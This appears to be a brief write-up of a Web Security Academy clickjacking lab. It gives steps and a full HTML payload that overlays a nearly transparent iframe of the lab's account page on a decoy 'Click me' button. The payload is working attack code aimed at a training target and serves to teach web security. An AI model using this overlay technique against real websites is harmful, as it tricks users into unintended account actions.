
1. Log in with your account;
2. Verify that any protections against ClickJacking;

![](/static/img/Pasted_image_20231120105752.png)

3. Go to exploit server and paste the following payload

```html
<style>
    iframe {
        position:relative;
        width:1000;
        height: 700;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:515px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a9900af04610dc382ac490d002e00f5.web-security-academy.net/my-account"></iframe>
```

![](/static/img/Pasted_image_20231120111300.png)


![](/static/img/Pasted_image_20231120110821.png)

